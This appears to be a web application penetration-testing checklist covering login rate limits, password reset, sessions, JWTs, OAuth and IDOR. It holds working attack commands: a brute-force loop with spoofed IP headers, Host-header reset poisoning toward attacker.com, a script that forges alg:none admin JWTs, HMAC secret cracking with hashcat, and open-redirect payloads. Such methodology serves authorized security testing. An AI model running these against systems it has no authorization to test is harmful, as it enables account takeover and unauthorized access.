Rate-limit bypass attempts# 1. X-Forwarded-For / IP-spoof headers
for ip in 127.0.0.1 1.1.1.1 attacker; do
  curl -X POST https://example.com/login \
    -H "X-Forwarded-For: $ip" \
    -H "X-Real-IP: $ip" \
    -H "X-Originating-IP: $ip" \
    -d "username=admin&password=guess$RANDOM"
done

# 2. Casing / path tricks (some WAFs key by exact path)
curl -X POST https://example.com/Login    # capital L
curl -X POST https://example.com/login/   # trailing slash
curl -X POST https://example.com/login%20 # %20 suffix
  • Map the login flow: form fields, redirect chain, cookies set, response timing
  • Username enumeration via response diff (timing, error message, status code) on login + registration + reset
  • Password policy: min length, complexity, common-password rejection
  • Account lockout after N failed attempts? (test with throwaway account)
  • Rate-limit bypass attempts: X-Forwarded-For, casing, slash variants, HTTP/2 multiplexing
  • If MFA: bypass via response tampering, missing-step, race on validation
  • "Remember me" cookie: format, entropy, expiry, server-side validation

3Password Reset Flow

Host-header poisoning on password resetcurl -sk -X POST https://example.com/forgot-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@example.com"
# Watch for the reset link in the email referencing attacker.com.
# Also try: X-Forwarded-Host, X-Forwarded-Server, X-Original-Host
  • Token entropy — request 5+ tokens, check for predictability (sequential, time-based, weak hash)
  • Token expiry — does it actually expire? Reuse after first use?
  • Host-header poisoning — change Host: attacker.com, see if reset link uses it
  • Token leakage via Referer when user clicks an external link from the reset page
  • Race condition: send password-reset request twice in parallel — does it accept the second token?
  • Username enumeration via reset flow ("we sent an email" vs "user not found")

4Session Management

  • Session ID entropy — Burp Sequencer or 100+ samples, check for patterns
  • Cookie flags: Secure, HttpOnly, SameSite=Lax|Strict
  • Logout actually invalidates the token server-side (replay after logout)
  • Session fixation — pre-authentication cookie kept after login?
  • Concurrent sessions allowed? Logout-from-all-devices feature?
  • CSRF token: present, validated server-side, regenerated per session, bound to user

5JWT Inspection

Decode + claims inspection# Quick decode (no signature check):
echo "<JWT>" | cut -d. -f1 | base64 -d 2>/dev/null
echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null

# With jwt_tool (full):
jwt_tool "<JWT>"
jwt_tool "<JWT>" -t https://example.com/api -rh "Authorization: Bearer <JWT>"
alg:none attackjwt_tool "<JWT>" -X a
# Or manually: change alg to "none", drop the signature, re-encode.
python3 -c "
import base64, json
hdr = {'alg':'none','typ':'JWT'}
pl  = {'sub':'admin','role':'admin'}
b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
print(f'{b64(hdr)}.{b64(pl)}.')
"
Algorithm confusion (RS256 → HS256)# 1. Pull the public key (often /.well-known/jwks.json)
curl -s https://example.com/.well-known/jwks.json
# 2. Convert JWK to PEM, then sign with the public key as the HMAC secret
jwt_tool "<JWT>" -X k -pk pubkey.pem
Brute-force weak HMAC secrethashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Or with john:
john --format=HMAC-SHA256 jwt.txt

Decode every JWT you see. Use jwt.io or jwt_tool -t <url> -rh "Authorization: Bearer <jwt>".

  • Decode header + payload — note algorithm, claims, expiry
  • Try "alg":"none" with empty signature
  • Algorithm confusion: change RS256 → HS256, sign with public key as the secret
  • "kid" injection: "kid":"../../dev/null", SQLi in kid, path traversal
  • "jku"/"x5u" header pointing to attacker-controlled URL
  • Weak HMAC secret crack: hashcat -m 16500 jwt.txt rockyou.txt
  • Claim tampering: change sub, role, tenant_id — does server validate?

redirect_uri parser-confusion battery# Test these one by one in a real OAuth login button:
?redirect_uri=https://attacker.com
?redirect_uri=//attacker.com
?redirect_uri=/\attacker.com
?redirect_uri=https://example.com.attacker.com
?redirect_uri=https://example.com@attacker.com
?redirect_uri=https://example.com#@attacker.com
?redirect_uri=https://example.com/../redirect
# Also try mixed-case: https://EXAMPLE.com  (some validators are case-sensitive)
  • state parameter present and validated (drop it — does login still complete?)
  • redirect_uri strict matching: try ?redirect_uri=evil.com, target.com.evil.com, target.com/../
  • PKCE on public clients (mobile/SPA)?
  • Scope creep: request more scopes than the app shows on consent
  • Issuer (iss) validated? Try a different IdP

7Authorization & IDOR

Build a role matrix. Test every state-changing action as every role.

  • Role matrix built: anon · user · second-user · admin · second-tenant
  • Numeric IDs in URLs: increment/decrement, check cross-user access
  • UUIDs: try predictable v1 UUIDs (timestamp-based), null, empty, broken format
  • HTTP method tampering: GET vs POST vs PUT vs DELETE on the same path
  • Mass assignment: send extra fields ("role":"admin", "isVerified":true) on update endpoints
  • Cross-tenant: switch tenant_id in JWT/URL/cookie, see if data isolation holds
  • Header-based access bypass: X-Original-URL, X-Rewrite-URL, X-Forwarded-For: 127.0.0.1
